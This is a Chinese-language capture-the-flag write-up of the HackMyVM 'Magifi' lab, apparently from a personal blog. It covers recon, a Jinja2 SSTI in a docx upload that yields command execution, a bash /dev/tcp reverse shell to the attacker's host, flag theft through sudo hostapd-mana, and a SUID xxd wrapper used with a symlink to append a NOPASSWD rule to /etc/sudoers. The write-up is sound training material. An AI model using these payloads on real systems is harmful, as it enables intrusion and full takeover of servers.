---
title: HackMyVM-Magifi
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Magifi.

> https://hackmyvm.eu/machines/machine.php?vm=Magifi
> 

Notes: **MagiFi is a machine designed to test a variety of offensive security skills, including web, network, wifi and privilege escalation techniques, requiring knowledge of network analysis and authentication mechanisms offering a realistic and immersive experience within a controlled environment. Creators @x4v1l0k and @M4rdc0re.**

第一台`Hard`靶机，看介绍存在`WIFI`利用也是第一次碰到

## 前期踩点

`nmap`扫描，`26`是靶机

```bash
┌──(root㉿kali)-[~/Desktop/test/magifi]
└─# nmap -sP 192.168.56.0/24                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:14 EST
Nmap scan report for 192.168.56.1
Host is up (0.00053s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00029s latency).
MAC Address: 08:00:27:34:2E:28 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.26
Host is up (0.00042s latency).
MAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)
```

```bash
┌──(root㉿kali)-[~/Desktop/test/magifi]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.26
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:15 EST
Nmap scan report for 192.168.56.26
Host is up (0.00047s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)
```

需要设置域名`hogwarts.htb` 记录

```bash
┌──(root㉿kali)-[~/Desktop/test/magifi]                                                                                                                      
└─# nmap -sT -A -T4 -O -p 22,80 192.168.56.26                                                                                                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 05:16 EST                                                                                           
Nmap scan report for 192.168.56.26                                                                                                                           
Host is up (0.00059s latency).                                                                                                                               
                                                                                                                                                             
PORT   STATE SERVICE VERSION                                                  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                
|   3072 0c:c6:d6:24:1e:5b:9e:66:25:0a:ba:0a:08:0b:18:40 (RSA)                                                                                               
|   256 9c:c3:1d:ea:22:04:93:b7:81:dd:f2:96:5d:f0:1f:9b (ECDSA)                                                                                              
|_  256 55:41:15:90:ff:1d:53:88:e7:65:91:4f:fd:cf:49:85 (ED25519)                                                                                            
80/tcp open  http    Werkzeug/3.0.4 Python/3.8.10                                                                                                            
|_http-title: Did not follow redirect to http://hogwarts.htb                                                                                                 
|_http-server-header: Werkzeug/3.0.4 Python/3.8.10                                                                                                           
| fingerprint-strings:                                                                                                                                       
|   GetRequest, HTTPOptions:                                                                                                                                 
|     HTTP/1.1 302 FOUND                                                                                                                                     
|     Server: Werkzeug/3.0.4 Python/3.8.10                                
|     Date: Wed, 12 Feb 2025 10:16:22 GMT                                                                                                                    
|     Content-Type: text/html; charset=utf-8                                  
|     Content-Length: 225          
|     Location: http://hogwarts.htb                                           
|     Connection: close                                                                                                                                      
|     <!doctype html>                                                                                                                                        
|     <html lang=en>                                                                                                                                         
|     <title>Redirecting...</title>                                           
|     <h1>Redirecting...</h1>                                                                                                                                
|     <p>You should be redirected automatically to the target URL: <a href="http://hogwarts.htb">http://hogwarts.htb</a>. If not, click the link.            
|   RTSPRequest:                                                                                                                                             
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"                                                                                                      
|     "http://www.w3.org/TR/html4/strict.dtd">                                                                                                               
|     <html>                                                                                                                                                 
|     <head>                                                                                                                                                 
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">                                                                                     
|     <title>Error response</title>                                                                                                                          
|     </head>                                                                                                                                                
|     <body>                                                                  
|     <h1>Error response</h1>                                                                                                                                
|     <p>Error code: 400</p>                                                  
|     <p>Message: Bad request version ('RTSP/1.0').</p>                                                                                                      
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>                                                      
|     </body>                                                                                                                                                
|_    </html>          
MAC Address: 08:00:27:33:7C:E1 (Oracle VirtualBox virtual NIC)                                                                                               
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        
Device type: general purpose                                                                                                                                 
Running: Linux 4.X|5.X                                                                                                                                       
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5           
OS details: Linux 4.15 - 5.8                                                                                                                                 
Network Distance: 1 hop                                                       
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   
                                                                              
TRACEROUTE                                                                                                                                                   
HOP RTT     ADDRESS                                                                                                                                          
1   0.59 ms 192.168.56.26                                           
```

再扫描一下网站目录，扫描出来`upload`文件夹，那么表示可能存在上传功能

```bash
┌──(root㉿kali)-[~/Desktop/test]
└─# dirsearch -u http://hogwarts.htb -x 403 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25
Wordlist size: 10439

Output File: /root/Desktop/test/reports/http_hogwarts.htb/_25-02-12_05-22-08.txt

Target: http://hogwarts.htb/

[05:22:08] Starting: 
[05:23:02] 405 -  153B  - /upload
```

访问页面，并采集指纹，采用`flask`搭建，那么可能存在`SSTI` （需要注意）, 内容大概是和哈利波特有关

![image.png](image%2083.png)

优先级`80` > `22` 

## 上传功能点测试

在页面最底下果然发现了上传文件功能，并且告诉我们使用他们的模板`template` ，是个超链接

![image.png](image%2084.png)

点击后是下载了一个`docx`文件，内容是，我们先按照它的格式填写好并上传

```bash
Application Letter to Hogwarts School of Witchcraft and Wizardry
Dear Headmaster or Headmistress,

I am writing to express my strong interest in applying for admission to Hogwarts School of Witchcraft and Wizardry. From a very young age, I have been fascinated by the magical world, and I believe that Hogwarts is the ideal place for me to develop my skills and knowledge in magic. I am eager to learn and grow under the guidance of the esteemed professors at your prestigious institution.

Throughout my life, I have demonstrated qualities such as curiosity, perseverance, and a deep desire to learn. I am particularly interested in subjects such as Charms, Potions, and Defense Against the Dark Arts, and I am confident that Hogwarts will provide me with the perfect environment to explore these interests.

I am excited about the opportunity to become a part of the rich tradition and community at Hogwarts, and I hope that my application will be considered for the upcoming academic year. I have enclosed all required documents and would be grateful for your consideration.

Thank you for your time and consideration. I look forward to the possibility of joining Hogwarts and contributing to its legacy of excellence.

Yours sincerely,

Name: [Your Name]
Surname: [Your Surname]
Address: [Your Address]
Birthday: [Your Birthday]
Pet breed: [Your Pets Breed]
Pet’s Name: [Your Pets Name]

```

上传之后回显我们输入的内容

![image.png](image%2085.png)

## SSTI 漏洞利用

测试一下是否存在`SSTI` ，我们将`name`设置为 `Name: {{ 7*7 }}` ，然后提交上传

欸嘿，果然存在`SSTI`

![image.png](image%2086.png)

开始构造`SSTI` ：

```bash
Name: {{self.__init__.__globals__.__builtins__}} ，且存在eval 和__import__
```

![image.png](image%2087.png)

```bash
Name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

![image.png](image%2088.png)

我直接读取`UserFlag` 

```bash
Name:{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/ harry_potter/user.txt').read()}}
```

注意空格,在有空格地方不能换行，在没空格的地方用空格顶到换行，否则空格会被换行符替换掉，然后上传上去的时候去掉换行符你的`payload`会变成 `cat/home…` 了

![image.png](image%2089.png)

反弹`shell` ，`kali`开启监听

```bash
Name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash -c "bash -  i >& /dev/tcp/192.168.56.4/4444 0>&1"').read()}}
```

成功获得`shell`

```bash
┌──(root㉿kali)-[~/Desktop/test/magifi]
└─# nc -lvp 4444                           
listening on [any] 4444 ...
connect to [192.168.56.4] from hogwarts.htb [192.168.56.26] 39508
bash: cannot set terminal process group (766): Inappropriate ioctl for device
bash: no job control in this shell
harry_potter@MagiFi:~/Hogwarts_web$ 
```

## 靶机信息收集

存在很多的无线网卡，并且能看到还有`Docker`的网卡

```bash
harry_potter@MagiFi:~$ ip add                                                 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                                    
    inet 127.0.0.1/8 scope host lo                                            
       valid_lft forever preferred_lft forever                                                                                                               
    inet6 ::1/128 scope host                                                  
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:33:7c:e1 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.26/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 529sec preferred_lft 529sec                                                                                                                 
    inet6 fe80::a00:27ff:fe33:7ce1/64 scope link                     
       valid_lft forever preferred_lft forever
14: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:10:80:36:d9 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
15: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff                        
16: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff                        
17: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff                        
18: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
19: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff                        
20: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff                        
21: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                      
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff                        
75: wlan60: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                     
    link/ether 02:00:00:00:3c:00 brd ff:ff:ff:ff:ff:ff                                                                                                       
76: hwsim0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000                                                                     
    link/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff          
78: veth1@if77: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000                                                    
    link/ether f6:e7:d7:e4:13:c6 brd ff:ff:ff:ff:ff:ff link-netnsid 0         
    inet 10.200.1.1/24 scope global veth1     
       valid_lft forever preferred_lft forever                                                                                                               
    inet6 fe80::f4e7:d7ff:fee4:13c6/64 scope link     
       valid_lft forever preferred_lft forever                          
80: veth2@if79: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000                                                    
    link/ether 2a:c1:47:8c:c6:64 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet 10.200.2.1/24 scope global veth2     
       valid_lft forever preferred_lft forever                                                                                                               
    inet6 fe80::28c1:47ff:fe8c:c664/64 scope link     
       valid_lft forever preferred_lft forever         
```

查看权限，可以使用`root`权限运行很多网络工具

```bash
harry_potter@MagiFi:~$ sudo -l
sudo -l
Matching Defaults entries for harry_potter on MagiFi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry_potter may run the following commands on MagiFi:
    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng,
        /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana
```

```bash
sudo /usr/sbin/aireplay-ng --help
sudo /usr/sbin/airmon-ng -h
sudo /usr/sbin/airodump-ng --help
sudo /usr/bin/airdecap-ng --help
sudo /usr/bin/hostapd-mana -h
```

## 解法 1

> 根据群友们提示
> 

首先查看`hostapd-mana`的帮助

```bash
harry_potter@MagiFi:~/Hogwarts_web$ sudo /usr/bin/hostapd-mana -h
hostapd-mana v2.6
User space daemon for IEEE 802.11 AP management,
IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
Copyright (c) 2002-2016, Jouni Malinen <j@w1.fi> and contributors
--------------------------------------------------
MANA https://github.com/sensepost/hostapd-mana
By @singe (dominic@sensepost.com)
Original MANA EAP by Ian (ian@sensepost.com)
Original karma patches by Robin Wood - robin@digininja.org
Original EAP patches by Brad Antoniewicz @brad_anton
Sycophant by Michael Kruger @_cablethief
usage: hostapd [-hdBKtv] [-P <PID file>] [-e <entropy file>] \
         [-g <global ctrl_iface>] [-G <group>]\
         [-i <comma-separated list of interface names>]\
         <configuration file(s)>

options:
   -h   show this usage
   -d   show more debug messages (-dd for even more)
   -B   run daemon in the background
   -e   entropy file
   -g   global control interface path
   -G   group for control interfaces
   -P   PID file
   -K   include key data in debug messages
   -i   list of interface names to use
   -S   start all the interfaces synchronously
   -t   include timestamps in some debug messages
   -v   show hostapd version
harry_potter@MagiFi:~/Hogwarts_web$ 
```

可以注意到`-d   show more debug messages (-dd for even more)` 输出更多调试信息，然后最后是跟上`<configuration file(s)>` 数据文件

然后我们在他后面跟上`/root/root.txt`即可读出`flag`

```bash
harry_potter@MagiFi:~/Hogwarts_web$ sudo /usr/bin/hostapd-mana -dd /root/root.txt
<_web$ sudo /usr/bin/hostapd-mana -dd /root/root.txt
random: Trying to read entropy from /dev/random
Configuration file: /root/root.txt
Line 1: invalid line 'hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}'
1 errors found in configuration file '/root/root.txt'
Failed to set up interface with /root/root.txt
hostapd_init: free iface 0x55809fa7af40
Failed to initialize interface
```

## 解法 2

查找系统中所有具有 `SUID（Set User ID）`权限的可执行文件

找到一些奇奇怪怪的，`/usr/bin/xxd_horcrux` 和`/home/tom.riddle/.horcrux.png`

```bash
harry_potter@MagiFi:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd                                                              
/usr/bin/chfn                 
/usr/bin/umount               
/usr/bin/newgrp                  
/usr/bin/xxd_horcrux  
/usr/lib/eject/dmcrypt-get-device
...
/home/tom.riddle/.horcrux.png
```

查看`/usr/bin/xxd_horcrux` 权限

```bash
harry_potter@MagiFi:~$ ls -al /usr/bin/xxd_horcrux
-rwsr-xr-x 1 root root 17264 Sep 25 12:22 /usr/bin/xxd_horcrux
```

尝试将`/etc/shadow`文件使用`xxd`读出来，貌似读不出来，这是莫改过的`xxd`

```bash
harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -i /etc/shadow -O pass
Not every wizards can use or destroy a Horcrux!
```

```bash
harry_potter@MagiFi:~$ find / -name *horcrux* 2>/dev/null
/usr/bin/xxd_horcrux
/home/tom.riddle/.horcrux.png
```

又尝试`/home/tom.riddle/.horcrux.png` 但是提示`permission denied` ，摸不着头脑

根据`xxd_horcrux`的提示，可能后面是要跟`.horcrux.png` ，不过还是提示了错误

```bash
harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -i /home/tom.riddle/.horcrux.png -O 1.txt
Not every wizards can use or destroy a Horcrux!
```

我们将`xxd_horcrux` 拉取出来，使用`IDA`分析

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char **argva; // [rsp+0h] [rbp-30h]
  int v5; // [rsp+Ch] [rbp-24h]
  int i; // [rsp+18h] [rbp-18h]
  int fd; // [rsp+1Ch] [rbp-14h]
  char *s1; // [rsp+20h] [rbp-10h]

  v5 = argc;
  argva = (char **)argv;
  s1 = 0LL;
  if ( argc <= 1
    || (argv = (const char **)"-h", *(_QWORD *)&argc = argva[1], !strcmp(*(const char **)&argc, "-h"))
    || (argv = (const char **)"--help", *(_QWORD *)&argc = argva[1], !strcmp(*(const char **)&argc, "--help")) )
  {
    show_help(*(_QWORD *)&argc, argv, envp);
    return 1;
  }
  else
  {
    for ( i = 1; i < v5; ++i )
    {
      if ( !strcmp(argva[i], "-O") && v5 > i + 1 )
      {
        s1 = argva[i + 1];
        argva[i] = 0LL;
        argva[i + 1] = 0LL;
        break;
      }
    }
    if ( s1 )
    {
      if ( !strcmp(s1, ".horcrux.png") )
      {
        fd = open(s1, 577, 384LL);
        if ( fd >= 0 )
        {
          if ( dup2(fd, 1) >= 0 )
          {
            close(fd);
            execvp("/usr/bin/xxd", argva);
            perror("Error executing xxd");
          }
          else
          {
            perror("Error redirecting output to file");
            close(fd);
          }
          return 1;
        }
        else
        {
          perror("Error opening output file");
          return 1;
        }
      }
      else
      {
        fwrite("Not every wizards can use or destroy a Horcrux!\n", 1uLL, 0x30uLL, stderr);
        return 1;
      }
    }
```

可以看到判断了是否存在`-O`参数，然后`-O`参数后面跟着的必须是`.horcrux.png` ，但是`.horcrux.png` 没有指定一定要是在`/home/tom.riddle` 家目录里面，所以我们可以在我们家目录创建`.horcrux.png` ，然后通过`xxd_horcurx`读取文件内容输出到`.horcrux.png`

```bash
harry_potter@MagiFi:~$ touch " " > .horcrux.png
harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux /root/root.txt -O .horcrux.png 
harry_potter@MagiFi:~$ cat .horcrux.png 
00000000: 686f 6777 6172 7473 7b35 6564 3038 3138  hogwarts{5ed0818
00000010: 6330 3138 3166 6539 3766 3734 3464 3762  c0181fe97f744d7b
00000020: 3162 3531 6464 3963 377d 0a              1b51dd9c7}.
harry_potter@MagiFi:~$ 
```

成功读到`Rootflag`文件

```bash
hogwarts{5ed0818c0181fe97f744d7b1b51dd9c7}.
```

顺便将`RootShell`也拿了，通过https://gtfobins.github.io/gtfobins/xxd/#file-write 可以知道可以利用`xxd`修改文件，我们将`/etc/passwd`或者`/etc/sudoer`修改即可

```bash
harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux /etc/sudoers -O .horcrux.png 
harry_potter@MagiFi:~$ cat .horcrux.png | xxd -r > tmp
harry_potter@MagiFi:~$ echo "harry_potter    ALL=(ALL:ALL) NOPASSWD: ALL" >> tmp
harry_potter@MagiFi:~$ rm .horcrux.png
harry_potter@MagiFi:~$ ln -sv /etc/sudoers .horcrux.png
'.horcrux.png' -> '/etc/sudoers'
harry_potter@MagiFi:~$ xxd tmp > getroot
harry_potter@MagiFi:~$ /usr/bin/xxd_horcrux -r getroot -O .horcrux.png 
```

再看一下我们的权限

```bash
harry_potter@MagiFi:~$ sudo -l
Matching Defaults entries for harry_potter on MagiFi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry_potter may run the following commands on MagiFi:
    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana
    (ALL : ALL) NOPASSWD: ALL
```

```bash
harry_potter@MagiFi:~$ sudo su -
root@MagiFi:~# id
uid=0(root) gid=0(root) groups=0(root)
root@MagiFi:~# 
```